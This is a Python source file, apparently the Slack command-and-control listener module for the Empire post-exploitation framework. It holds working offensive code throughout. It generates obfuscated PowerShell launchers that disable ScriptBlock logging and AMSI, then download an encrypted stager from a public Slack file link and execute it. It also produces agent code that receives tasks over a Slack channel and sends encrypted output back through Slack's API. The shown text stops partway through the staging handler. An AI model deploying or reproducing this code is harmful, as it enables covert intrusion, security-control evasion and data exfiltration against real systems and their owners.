import base64
import random
import os
import re
import time
from datetime import datetime
import copy
import traceback
import sys
import json
import string
import traceback
from pydispatch import dispatcher
from slackclient import SlackClient
import zlib

# Empire imports
from lib.common import helpers
from lib.common import agents
from lib.common import encryption
from lib.common import packets
from lib.common import messages


class Listener:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Slack',

            'Author': ['@OneLogicalMyth'],

            'Description': ("Starts a listener for Slack using the API."),

            # categories - client_server, peer_to_peer, broadcast, third_party
            'Category' : ('client_server'),

            'Comments': []
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}

            'Name' : {
                'Description'   :   'Name for the listener.',
                'Required'      :   True,
                'Value'         :   'slack'
            },
            'APIToken' : {
                'Description'   :   'Bot API Token, visit https://slack.com/apps/A0F7YS25R to get one.',
                'Required'      :   True,
                'Value'         :   'xoxb-123456789123-123456789123-ExampleSlackAPIToken'
            },
            'UserAPIToken' : {
                'Description'   :   'API Token, used for staging visit https://api.slack.com/custom-integrations/legacy-tokens to get one.',
                'Required'      :   True,
                'Value'         :   'xoxp-123456789123-123456789123-ExampleSlackAPIToken'
            },
            'ChannelComms' : {
                'Description'   :   'The Slack channel to use for comms.',
                'Required'      :   True,
                'Value'         :   'empire_comms'
            },
            'PollInterval' : {
                'Description'   :   'How often to check Slack for new messages (Empire instance/server side). Recommended is 0.5 second.',
                'Required'      :   True,
                'Value'         :   0.5
            },
            'StartMessage' : {
                'Description'   :   'When the listener starts it will post this message to the Slack channel, just a bit of fun.',
                'Required'      :   False,
                'Value'         :   None
            },
            'Launcher' : {
                'Description'   :   'Launcher string.',
                'Required'      :   True,
                'Value'         :   'powershell -noP -sta -w 1 -enc '
            },
            'StagingKey' : {
                'Description'   :   'Staging key for initial agent negotiation.',
                'Required'      :   True,
                'Value'         :   'ec1a0eab303df7f47caaed136561a960'
            },
            'DefaultDelay' : {
                'Description'   :   'Agent delay/reach back interval (in seconds).',
                'Required'      :   True,
                'Value'         :   10
            },
            'DefaultJitter' : {
                'Description'   :   'Jitter in agent reachback interval (0.0-1.0).',
                'Required'      :   True,
                'Value'         :   0.0
            },
            'DefaultLostLimit' : {
                'Description'   :   'Number of missed checkins before exiting',
                'Required'      :   True,
                'Value'         :   60
            },
            'DefaultProfile' : {
                'Description'   :   'Default communication profile for the agent.',
                'Required'      :   True,
                'Value'         :   "N/A|Slackbot 1.0(+https://api.slack.com/robots)"
            },
            'CertPath' : {
                'Description'   :   'Certificate path for https listeners.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'KillDate' : {
                'Description'   :   'Date for the listener to exit (MM/dd/yyyy).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WorkingHours' : {
                'Description'   :   'Hours for the agent to operate (09:00-17:00).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'SlackToken' : {
                'Description'   :   'Your SlackBot API token to communicate with your Slack instance.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SlackChannel' : {
                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
                'Required'      :   False,
                'Value'         :   '#general'
            }
        }

        # required:
        self.mainMenu = mainMenu
        self.threads = {} # used to keep track of any threaded instances of this server

        # optional/specific for this module
        self.options['ChannelComms_ID'] = {
                                            'Description' : 'channel internal ID that slack uses',
                                            'Required'    : False,
                                            'Value'       : 'tbc'
                                          }

        # set the default staging key to the controller db default
        self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])


    def default_response(self):
        """
        If there's a default response expected from the server that the client needs to ignore,
        (i.e. a default HTTP page), put the generation here.
        """
        #print helpers.color("[!] default_response() not implemented for listeners/template")
        return ''


    def validate_options(self):
        """
        Validate all options for this listener.
        """

        for key in self.options:
            if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
                print helpers.color("[!] Option \"%s\" is required." % (key))
                return False

        # validate Slack API token and configuration
        sc = SlackClient(self.options['UserAPIToken']['Value'])
        SlackChannels = sc.api_call('channels.list')
        PrivateChannels = sc.api_call('groups.list')

        # if the token is unable to retrieve the list of channels return exact error, most common is bad API token
        if 'error' in SlackChannels:
            print helpers.color('[!] An error was returned from Slack: ' + SlackChannels['error'])
            return False
        else:

            CommsName   = self.options['ChannelComms']['Value']

            # build a list of channel names and store the channel info for later use
            ChannelNames = []
            CommsChannel = None

            for channel in SlackChannels['channels']:
                ChannelNames.append(channel['name'])
                if CommsName == channel['name']:
                    CommsChannel = channel

            for channel in PrivateChannels['groups']:
                ChannelNames.append(channel['name'])
                if CommsName == channel['name']:
                    CommsChannel = channel

            if not CommsName in ChannelNames or CommsChannel == None:
                print helpers.color('[!] No channel "' + CommsName + '", please create channel.')
                return False

            self.options['ChannelComms_ID']['Value'] = CommsChannel['id']

        return True


    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
        if not language:
            print helpers.color("[!] listeners/onedrive generate_launcher(): No language specified")

        if listenerName and (listenerName in self.threads) and (listenerName in self.mainMenu.listeners.activeListeners):
            listener_options = self.mainMenu.listeners.activeListeners[listenerName]['options']
            staging_key = listener_options['StagingKey']['Value']
            profile = listener_options['DefaultProfile']['Value']
            launcher_cmd = listener_options['Launcher']['Value']
            staging_key = listener_options['StagingKey']['Value']

            if language.startswith("power"):
                launcher = ""#"$ErrorActionPreference = 'SilentlyContinue';" #Set as empty string for debugging

                if safeChecks.lower() == 'true':
                    launcher += helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")

                    # ScriptBlock Logging bypass
                    launcher += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
                    launcher += "'System.Management.Automation.Utils'"
                    launcher += helpers.randomize_capitalization(").\"GetFie`ld\"(")
                    launcher += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
                    launcher += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
                    launcher += "['ScriptB'+'lockLogging']"
                    launcher += helpers.randomize_capitalization("){$GPC")
                    launcher += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
                    launcher += helpers.randomize_capitalization("$GPC")
                    launcher += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
                    launcher += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
                    launcher += "('EnableScriptB'+'lockLogging',0);"
                    launcher += helpers.randomize_capitalization("$val.Add")
                    launcher += "('EnableScriptBlockInvocationLogging',0);"
                    launcher += helpers.randomize_capitalization("$GPC")
                    launcher += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
                    launcher += helpers.randomize_capitalization("=$val}")
                    launcher += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
                    launcher += "'signatures','N'+'onPublic,Static'"
                    launcher += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")

                    # @mattifestation's AMSI bypass
                    launcher += helpers.randomize_capitalization("$Ref=[Ref].Assembly.GetType(")
                    launcher += "'System.Management.Automation.AmsiUtils'"
                    launcher += helpers.randomize_capitalization(');$Ref.GetField(')
                    launcher += "'amsiInitFailed','NonPublic,Static'"
                    launcher += helpers.randomize_capitalization(").SetValue($null,$true);")
                    launcher += "};"
                    launcher += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")

                launcher += helpers.randomize_capitalization("$wc=New-Object SYstem.Net.WebClient;")

                if userAgent.lower() == 'default':
                    profile = listener_options['DefaultProfile']['Value']
                    userAgent = profile.split("|")[1]
                launcher += "$u='" + userAgent + "';"

                if userAgent.lower() != 'none' or proxy.lower() != 'none':
                    if userAgent.lower() != 'none':
                        launcher += helpers.randomize_capitalization("$wc.Headers.Add(")
                        launcher += "'User-Agent',$u);"

                    if proxy.lower() != 'none':
                        if proxy.lower() == 'default':
                            launcher += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
                        else:
                            launcher += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy;")
                            launcher += helpers.randomize_capitalization("$proxy.Address = '"+ proxy.lower() +"';")
                            launcher += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
                    if proxyCreds.lower() == "default":
                        launcher += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                    else:
                        username = proxyCreds.split(":")[0]
                        password = proxyCreds.split(":")[1]
                        domain = username.split("\\")[0]
                        usr = username.split("\\")[1]
                        launcher += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
                        launcher += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")

                    launcher += "$Script:Proxy = $wc.Proxy;"

                # code to turn the key string into a byte array
                launcher += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
                launcher += ("'%s');" % staging_key)

                # this is the minimized RC4 launcher code from rc4.ps1
                launcher += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')

                launcher += helpers.randomize_capitalization("$data=$wc.DownloadData('")
                launcher += self.mainMenu.listeners.activeListeners[listenerName]['stager_url']
                launcher += helpers.randomize_capitalization("');$iv=$data[0..3];$data=$data[4..$data.length];")

                launcher += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")

                if obfuscate:
                    launcher = helpers.obfuscate(self.mainMenu.installPath, launcher, obfuscationCommand=obfuscationCommand)

                if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                    return helpers.powershell_launcher(launcher, launcher_cmd)
                else:
                    return launcher

            if language.startswith("pyth"):
                print helpers.color("[!] listeners/slack generate_launcher(): Python agent not implimented yet")
                return "python not implimented yet"

        else:
            print helpers.color("[!] listeners/slack generate_launcher(): invalid listener name")


    def generate_stager(self, listenerOptions, encode=False, encrypt=True, language=None):
        """
        Generate the stager code
        """

        if not language:
            print helpers.color("[!] listeners/slack generate_stager(): no language specified")
            return None

        staging_key = listenerOptions['StagingKey']['Value']
        workingHours = listenerOptions['WorkingHours']['Value']
        killDate = listenerOptions['KillDate']['Value']
        profile = listenerOptions['DefaultProfile']['Value']
        agent_delay = listenerOptions['DefaultDelay']['Value']
        api_token = listenerOptions['APIToken']['Value']
        channel_id = listenerOptions['ChannelComms_ID']['Value']

        if language.lower() == 'powershell':
            f = open("%s/data/agent/stagers/slack.ps1" % self.mainMenu.installPath)
            stager = f.read()
            f.close()

            stager = stager.replace('REPLACE_STAGING_KEY', staging_key)
            stager = stager.replace('REPLACE_SLACK_API_TOKEN', api_token)
            stager = stager.replace('REPLACE_SLACK_CHANNEL', channel_id)

            #patch in working hours, if any
            if workingHours != "":
                stager = stager.replace('WORKING_HOURS_REPLACE', workingHours)

            #Patch in the killdate, if any
            if killDate != "":
                stager = stager.replace('REPLACE_KILLDATE', killDate)

            randomized_stager = ''

            for line in stager.split("\n"):
                line = line.strip()

                if not line.startswith("#"):
                    if "\"" not in line:
                        randomized_stager += helpers.randomize_capitalization(line)
                    else:
                        randomized_stager += line

            if encode:
                return helpers.enc_powershell(randomized_stager)
            elif encrypt:
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(RC4IV+staging_key, randomized_stager)
            else:
                return randomized_stager

        else:
            print helpers.color("[!] Python agent not available for Slack")


    def generate_agent(self, listener_options, agent_id, language=None):
        """
        Generate the agent code
        """

        if not language:
            print helpers.color("[!] listeners/slack generate_agent(): No language specified")
            return

        language = language.lower()
        delay = listener_options['DefaultDelay']['Value']
        jitter = listener_options['DefaultJitter']['Value']
        profile = listener_options['DefaultProfile']['Value']
        lost_limit = listener_options['DefaultLostLimit']['Value']
        working_hours = listener_options['WorkingHours']['Value']
        kill_date = listener_options['KillDate']['Value']
        b64_default_response = base64.b64encode(self.default_response())

        if language == 'powershell':
            f = open(self.mainMenu.installPath + "/data/agent/agent.ps1")
            agent_code = f.read()
            f.close()

            comms_code = self.generate_comms(listener_options, agent_id, language)
            agent_code = agent_code.replace("REPLACE_COMMS", comms_code)

            agent_code = helpers.strip_powershell_comments(agent_code)

            agent_code = agent_code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
            agent_code = agent_code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
            agent_code = agent_code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
            agent_code = agent_code.replace('$LostLimit = 60', "$LostLimit = " + str(lost_limit))
            agent_code = agent_code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+b64_default_response+'"')

            if kill_date != "":
                agent_code = agent_code.replace("$KillDate,", "$KillDate = '" + str(kill_date) + "',")

            return agent_code


    def generate_comms(self, listenerOptions, agent_id, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.
        This is so agents can easily be dynamically updated for the new listener.

        This should be implemented for the module.
        """

        api_token = listenerOptions['APIToken']['Value']
        channel_id = listenerOptions['ChannelComms_ID']['Value']

        if language:
            if language.lower() == 'powershell':

                getTask = """
                    function ConvertFrom-Json20([object] $item){ 
                        add-type -assembly system.web.extensions
                        $ps_js=new-object system.web.script.serialization.javascriptSerializer
                        return ,$ps_js.DeserializeObject($item)
                    }

                    function Decode-Base64 {
                        param($base64)
                        return [convert]::FromBase64String($base64)
                    }

                    $Script:TaskingTracker = @{TaskTS=$null;ServerReplies=0;ServerLastReply=$null};
                    $script:GetTask = {

                        write-host '[*] Getting tasks'

                        try {
                            $waiting = $false
                            $APIToken = '"""+ api_token +"""'
                            $Channel = '"""+ channel_id +"""'
                            $AgentID = '"""+ agent_id +"""'

                            # build the web request object
                            $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient

                            # set the proxy settings for the WC to be the default system settings
                            $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                            $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                            if($Script:Proxy) {
                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
                            }

                            # Look for reply to previous tasking message
                            if($Script:TaskingTracker.TaskTS) {
                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded');
                                $slack_response2=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/channels.replies","POST","token=$($APIToken)&channel=$($Channel)&thread_ts=$($Script:TaskingTracker.TaskTS)")
                                $slack_response=ConvertFrom-Json20 $slack_response2;

                                if($slack_response['messages'].length -eq 3) {
                                    $data_thread = $slack_response['messages'][-1]['text']
                                    write-host "Data thread: $data_thread"

                                    $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded');
                                    $data_response=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/channels.replies","POST","token=$($APIToken)&channel=$($Channel)&thread_ts=$($data_thread)")
                                    write-host $data_response
                                    $data_response=ConvertFrom-Json20 $data_response;

                                    $raw_base64 = (($data_response['messages'] | %{ $_["text"] }) -join '').Replace('-MESSAGE_END-','')
                                    
                                    write-host "[*] Base64 joined back together total length is $($raw_base64.length)";
                                    
                                    $result=Decode-Base64 $raw_base64;
                                    $result
                                }
                                elseif($slack_response['messages'].length -eq 2) {
                                    $waiting = $true
                                }
                            }

                            if($waiting -eq $false) {
                                # meta 'TASKING_REQUEST' : 4
                                $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
                                $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)

                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$script:UserAgent)
                                $script:Headers.GetEnumerator() | % {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}

                                $RoutingPacket_base64 = [Convert]::ToBase64String($RoutingPacket)

                                try {
                                    $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
                                    $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.postMessage","POST","token=$($APIToken)&channel=$($Channel)&text=$([System.Net.WebUtility]::UrlEncode($RoutingPacket_base64))&username=$($AgentID):STAGED")

                                    # grab the timestamp from the sent message so we can track a response
                                    $slack_response = ConvertFrom-Json20 $response
                                    $Script:TaskingTracker.TaskTS = $slack_response["ts"]

                                }
                                catch [System.Net.WebException]{$null}
                            }
                        }
                        catch [Net.WebException] {
                            write-host $_
                            $script:MissedCheckins += 1
                            #if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                                # restart key negotiation
                            #    Start-Negotiate -S "$ser" -SK $SK -UA $ua
                            #}
                        }
                    }
                """

                sendMessage = """
                    $script:SendMessage = {
                        param($Packets)

                        #write-host '[*] Sending messages'
                        if($Packets) {
                            
                            $APIToken = '"""+ api_token +"""'
                            $Channel = '"""+ channel_id +"""'
                            $AgentID = '"""+ agent_id +"""'

                            $encBytes = encrypt-bytes $packets
                            $RoutingPacket = New-RoutingPacket -encData $encBytes -Meta 5
                            $RoutingPacket_base64 = [Convert]::ToBase64String($RoutingPacket)

                            # build the web request object
                            $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
                            # set the proxy settings for the WC to be the default system settings
                            $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                            $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                            if($Script:Proxy) {
                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
                            }

                            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $Script:UserAgent)
                            $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}

                            try {
                                $Parts_to_send = $RoutingPacket_base64 -split "(.{3500})" | where {$_}

                                Write-Host "Sending $($encBytes.length) bytes, $($parts_to_send.count) messages"

                                # send the header
                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
                                $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.postMessage","POST","token=$($APIToken)&channel=$($Channel)&text=--MESSAGE_START--&username=$($AgentID):STAGED")
                                $thread_ts = (ConvertFrom-Json20 $response)["ts"]
                                Start-Sleep 1

                                # send the parts
                                foreach($part in $Parts_to_send) {
                                    $part = $([System.Net.WebUtility]::UrlEncode($part))
                                    
                                    $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
                                    $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.postMessage","POST","token=$($APIToken)&channel=$($Channel)&text=$($part)&username=$($AgentID):STAGED&thread_ts=$thread_ts")
                                    Start-Sleep 1

                                }
                                

                                # send the finish
                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
                                $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.postMessage","POST","token=$($APIToken)&channel=$($Channel)&text=--MESSAGE_END--&username=$($AgentID):STAGED&thread_ts=$thread_ts")


                            }
                            catch [System.Net.WebException]{$null}
                        }
                    }
                """
                
                return getTask + sendMessage + "\n'New agent comms registered!'"

            elif language.lower() == 'python':
                # send_message()
                pass
            else:
                print helpers.color("[!] listeners/slack generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module.")
        else:
            print helpers.color('[!] listeners/slack generate_comms(): no language specified!')


    def start_server(self, listenerOptions):

        # utility function for handling commands
        def get_data(thread_ts):

            finished = False
            while finished == False:
                # get all the replies
                replies = user_slack_client.api_call('channels.replies', channel=channel_id, thread_ts=thread_ts)

                # check if --MESSAGE_END-- has been sent
                data_return = ''
                for msg in replies["messages"]:
                    data_return += msg["text"]
                    if msg["text"] == '--MESSAGE_END--':
                        finished = True

                #time.sleep(1)

            # now we have all the data sent lets build it back to 
            data_return = data_return.replace('--MESSAGE_START--','').replace('--MESSAGE_END--','')
            data = base64.b64decode(data_return)

            return data

        def parse_commands(slack_events,bot_id):

            # Parses a list of events coming from the Slack RTM API to find commands.
            return_array = []
            for event in slack_events:
                # if it has a type and subtype most likely a message to process
                if 'type' in event and 'subtype' in event:
                    if event["type"] == "message" and event["channel"] != bot_id and event["subtype"] != "message_replied":

                        # grab more details such as the username of the poster
                        event_details = user_slack_client.api_call("channels.history",channel=channel_id,latest=event["ts"],inclusive=True,count=1)
                        #time.sleep(1)

                        if 'messages' in event_details:
                            message = event_details["messages"][0]
                            thread_ts = message["ts"]

                            if 'thread_ts' in message:

                                if message["thread_ts"] == thread_ts:

                                    not_thread = True
                                else:
                                    not_thread = False
                            else:
                                not_thread = True

                            if not_thread:
                                reaction = slack_client.api_call("reactions.add", name='thumbsup', channel=channel_id, timestamp=thread_ts)

                                # by adding a thumbs up helps the listener keep track of what it has processed
                                if 'username' in message and not 'error' in reaction:
                                    raw_message = message["text"]
                                    # incoming agent data from a task
                                    if raw_message == '--MESSAGE_START--':
                                        data = get_data(thread_ts)
                                    else:
                                        data = None

                                    if "username" in message:
                                        agent = message["username"]
                                    else:
                                        agent = 'unknown:unknown'
                                        print helpers.color("[!] No agent name for message: {}".format(message))

                                    if ':' in agent and raw_message:
                                        if not data:
                                            data = base64.b64decode(raw_message)
                                        agent, stage = agent.split(':')
                                        return_array.append((agent, stage, data, thread_ts))


            #time.sleep(1)
            return return_array

        def upload_stager():

            ps_stager = self.generate_stager(listenerOptions=listener_options, language='powershell')

            random_name = ''.join([random.choice(string.ascii_letters + string.digits) for n in range(10)])
            file_info = user_slack_client.api_call('files.upload',file=ps_stager,filename=random_name.lower(),channels=bot_id)
            
            if 'file' in file_info:
                # grab the file id and set the file to public
                file_id = file_info["file"]["id"]
                file_info = user_slack_client.api_call('files.sharedPublicURL',file=file_id)

                # generate the perma direct link
                file_pub = file_info["file"]["permalink_public"].split('/')[-1]
                file_pub = file_pub.split('-')
                stager_url = 'https://files.slack.com/files-pri/%s-%s/REPLACE_NAME?pub_secret=%s' % tuple(file_pub)
                stager_url = stager_url.replace('REPLACE_NAME',file_info["file"]["name"])

                # set the stager URL to use
                self.mainMenu.listeners.activeListeners[listener_name]['stager_url'] = stager_url
                self.mainMenu.listeners.activeListeners[listener_name]['stager_id'] = file_id

            else:
                print helpers.color("[!] Something went wrong uploading stager")
                message = stager_url
                signal = json.dumps({
                    'print' : True,
                    'message': message
                })
                dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))

        def post_data(data_to_send,agent,channel_id,thread_ts,listener_name,api_token):

            def split_data(data):
                n=39000
                return [data[i:i+n] for i in range(0, len(data), n)]

            # Slack will automatically split up messages longer than ~3900 chars, and they don't make into their own thread
            # so if we're making a new thread, we need to post a sinble message so we get the correct thread ID
            slack_client = SlackClient(api_token)
            if not thread_ts:
                parts = [data_to_send[0:3880]] + split_data(data_to_send[3880:-1])
            else:
                parts = split_data(data_to_send)

            part_count = 1

            for part in parts:

                message = "[*] Sending message to Slack for {}, part {} of {} sent ({} bytes)".format(agent,str(part_count),str(len(parts)),len(part))
                signal = json.dumps({
                    'print' : False,
                    'message': message
                })
                dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
                response = slack_client.api_call('chat.postMessage', channel=channel_id, text=part, as_user=False, thread_ts=thread_ts)


                if not thread_ts:
                    thread_ts = response['ts']

                # have to limit the replies to one per second or face rate limiting
                time.sleep(0.2)
                part_count += 1

            # send finish flag to Slack
            message = "[+] Sending notification that Slack thread is complete for agent {}.".format(agent)
            signal = json.dumps({
                'print' : False,
                'message': message
            })
            dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
            response = slack_client.api_call('chat.postMessage', channel=channel_id, text='-MESSAGE_END-', as_user=False, thread_ts=thread_ts)
            return thread_ts

        def compress(data):
            compobj = zlib.compressobj(9, zlib.DEFLATED, zlib.MAX_WBITS|16)
            return compobj.compress(data) + compobj.flush()


        listener_options = copy.deepcopy(listenerOptions)

        listener_name = listener_options['Name']['Value']
        staging_key = listener_options['StagingKey']['Value']
        poll_interval = listener_options['PollInterval']['Value']
        api_token = listener_options['APIToken']['Value']
        user_api_token = listener_options['UserAPIToken']['Value']
        channel_id = listener_options['ChannelComms_ID']['Value']
        startup_message = listener_options['StartMessage']['Value']
        channel_name = listener_options['ChannelComms']['Value']

        slack_client = SlackClient(api_token)
        user_slack_client = SlackClient(user_api_token)

        # Read bot's user ID by calling Web API method `auth.test`
        bot_id = slack_client.api_call("auth.test")["user_id"]


        # validate Slack API token and configuration
        SlackChannels = user_slack_client.api_call('channels.list')
        PrivateChannels = user_slack_client.api_call('groups.list')

        # if the token is unable to retrieve the list of channels return exact error, most common is bad API token
        if 'error' in SlackChannels:
            print helpers.color('[!] An error was returned from Slack: ' + SlackChannels['error'])
            return False
        else:

            CommsName   = listener_options['ChannelComms']['Value']

            # build a list of channel names and store the channel info for later use
            ChannelNames = []
            CommsChannel = None

            for channel in SlackChannels['channels']:
                ChannelNames.append(channel['name'])
                if CommsName == channel['name']:
                    CommsChannel = channel

            for channel in PrivateChannels['groups']:
                ChannelNames.append(channel['name'])
                if CommsName == channel['name']:
                    CommsChannel = channel

        # check channels are setup are all ok and if not correct them
        if not CommsName in ChannelNames or CommsChannel == None:
            response = user_slack_client.api_call("channels.create", name=channel_name)
            if not 'error' in response:
                message = '[+] The channel {} was created in Slack.'.format(channel_name)
                signal = json.dumps({
                    'print' : True,
                    'message': message
                })
                dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
            else:
                print helpers.color('[!] The channel {}, couldn\'t be created.'.format(channel_name))
                return False
        elif CommsChannel['is_archived']:
            response = user_slack_client.api_call("channels.unarchive", channel=channel_id)
            if not 'error' in response:
                message = '[+] The channel {} was unarchived in Slack.'.format(channel_name)
                signal = json.dumps({
                    'print' : True,
                    'message': message
                })
                dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
            else:
                print helpers.color('[!] The channel {}, couldn\'t be unarchived.'.format(channel_name))
                return False
        elif 'is_member' in  CommsChannel:
            if not CommsChannel['is_member']:
                response = user_slack_client.api_call("channels.invite", channel=channel_id, user=bot_id)
                if not 'error' in response:
                    message = '[+] The bot was invited to channel {} in Slack.'.format(channel_name)
                    signal = json.dumps({
                        'print' : True,
                        'message': message
                    })
                    dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
                else:
                    print helpers.color('[!] The bot couldn\'t be invited to channel {}.'.format(channel_name))
                    return False

        if slack_client.rtm_connect(with_team_state=False,auto_reconnect=True):

            while True:
                #Wait until Empire is aware the listener is running, so we can save our stager URL
                try:
                    if listener_name in self.mainMenu.listeners.activeListeners.keys():
                        upload_stager()
                        break
                    else:
                        time.sleep(1)
                except AttributeError:
                    time.sleep(1)

            # post a message if present
            if startup_message:
                user_slack_client.api_call("chat.postMessage", channel=channel_id, as_user=False, username='listener_' + listener_name, text=startup_message)
            
            # Set the listener in a while loop
            while slack_client.server.connected is True:

                # sleep for poll interval
                time.sleep(float(poll_interval))

                # try to process command sent if fails then simply wait until next poll interval and try again
                try:
                    a = datetime.now()
                    raw = []
                    done = False
                    while not done:
                        message = slack_client.rtm_read()
                        if message:
                            for m in message:
                                raw.append(m)
                        else:
                            done = True

                    messages = parse_commands(raw,bot_id)
                    b = datetime.now()
                    d = b-a
                    if len(raw) > 0:
                        print "Parsing %d/%d messages took %f seconds" % (len(messages), len(raw), d.total_seconds())

                    for message in messages:
                        agent, stage, data, thread_ts = message
                        # if there is some data then proceed
                        if data:

                            # we have data lets grab a list of agents
                            agent_ids = self.mainMenu.agents.get_agents_for_listener(listener_name)

                            if stage == '3':
                                lang, return_val = self.mainMenu.agents.handle_agent_data(staging_key, data, listener_options)[0]
                                stage_data = base64.encodestring(return_val)

                                message = "[*] Processing stage 3 of the staging process for agent {}, total base64 string length is {}".format(agent,str(len(stage_data)))
                                signal = json.dumps({
                                    'print' : False,
                                    'message': message
                                })
                                dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))

                                response = slack_client.rtm_send_message(channel_id, stage_data, thread_ts, False)


                            elif stage == '5':

                                lang, return_val = self.mainMenu.agents.handle_agent_data(staging_key, data, listener_options)[0]
                                session_key = self.mainMenu.agents.agents[agent]['sessionKey']
                                agent_code = str(self.generate_agent(listener_options, agent, lang))
                                compressed = compress(agent_code)
                                enc_code = encryption.aes_encrypt_then_hmac(session_key, compressed)
                                agent_upload = base64.encodestring(enc_code)

                                message = "[*] Processing stage 5 of the staging process for agent {}, total base64 string length is {}".format(agent,str(len(agent_upload)))
                                signal = json.dumps({
                                    'print' : False,
                                    'message': message
                                })
                                dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))

